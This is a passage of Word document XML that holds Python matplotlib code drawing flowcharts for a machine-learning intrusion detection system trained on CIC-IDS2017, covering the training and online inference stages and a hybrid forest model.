    </w:p>
    <w:p w14:paraId="7171258C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    train = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F1F7D1C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("CIC-IDS2017 抽样",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D3158D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">         "CSV 版 6 类\nBenign / PortScan\nDDoS / DoS Hulk\nFTP / SSH-Patator"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="074BE2CC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("数据清洗", "缺失值 / ∞ 值\n去重 · 异常剔除"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C3EC717">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("分层划分 + 预处理", "训练:验证:测试\n= 7 : 2 : 1\nStandardScaler\nclass_weight"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC4B0F7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("五模型训练", "决策树 / 随机森林\nXGBoost / 逻辑回归\n混合森林（新增）"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ED3D579">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("评估与模型产物", "P / R / F1 · 混淆矩阵\n特征重要性排序\nbest_model.pkl"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F4AB2E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FA8938B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for i, (head, body) in enumerate(train):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="677D05EE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        x = xs + i * (w + gap)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF1ADA2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        box(ax, x, yb, w, hb, head, body, "center")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A44A1C6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if i:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="184D38C4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            arrow(ax, (x - gap, yb + hb / 2), (x, yb + hb / 2))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ECDDF86">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3601F289">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.text(4.5, 41.5, "（b）在线推理：每 2 s 一个聚合窗口",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FF824C5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ha="left", va="center", fontsize=10.2, color=INK, weight="bold")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44859972">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="629062DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    xs2, w2, gap2, yb2, hb2 = 3.5, 23.0, 3.2, 8, 24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16E8B955">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    infer = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7875E606">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("特征向量（M2）", "五元组会话聚合\n对齐 CIC 口径"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D0C9B1B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("预处理", "复用训练期\nscaler 参数"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D4C9DDA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("分类器推理", "best_model\npredict_proba\n类别概率输出"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6791A964">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("类别 + 置信度", "BENIGN / PortScan\nDDoS / DoS Hulk\nFTP / SSH-Patator"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67FFEB80">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("证据打包", "Top-k 特征取值\n报文摘要"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E33AD6F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("M4 LLM 诊断", "转图 3\n大模型诊断"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D6A0C23">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23EF6B44">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for i, (head, body) in enumerate(infer):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="441D7CCC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        x = xs2 + i * (w2 + gap2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549D926C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        key = "llm" if i == len(infer) - 1 else "plain"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23DA0196">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        box(ax, x, yb2, w2, hb2, head, body, key)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="496746D3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if i:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5727854D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            arrow(ax, (x - gap2, yb2 + hb2 / 2), (x, yb2 + hb2 / 2))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5188E7EC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F6D6EEC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    x_model = xs + 4 * (w + gap) + w / 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68360A09">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    x_clf = xs2 + 2 * (w2 + gap2) + w2 / 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3137B554">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    elbow(ax, [(x_model, yb), (x_model, 47.5), (x_clf, 47.5), (x_clf, yb2 + hb2)])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DF427A5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.text((x_model + x_clf) / 2 + 10, 48.1, "加载模型文件",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25E33B54">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ha="center", va="bottom", fontsize=FS_NOTE, color=GREY, zorder=5,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A017DC8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            bbox=dict(boxstyle="round,pad=0.26", fc="white", ec="none", alpha=0.96))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2192B690">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A867827">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fig.savefig(OUT / "fig2_ml_model.png", dpi=300)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A33778E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    plt.close(fig)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11BB8DC4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10BEC124">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08F10F8F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ---------------------------------------------------------------- 图 2b 混合森林内部结构</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B79CBA3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def fig_hybrid_forest():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31928974">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fig, ax = canvas()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="493C82B6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="002F7B76">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 40, 88, 80, 10, "训练集：分层抽样后（约 30 万 × 78 维）", key="center", hs=9.5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="272E0C05">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10D85A9A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.text(3, 84.5, "Bagging\nbootstrap 采样\n+ 随机特征子集",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DCA7F77">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ha="left", va="center", fontsize=FS_NOTE, color=GREY, zorder=5, linespacing=1.6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29CC0634">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A59BE88">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 分叉总线</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9835B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.plot([80, 80], [88, 84.5], color=GREY, lw=1.4, zorder=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F84D8CE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.plot([28, 132], [84.5, 84.5], color=GREY, lw=1.4, zorder=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52C12DD5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for x in (28, 80, 132):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="663CB7CD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
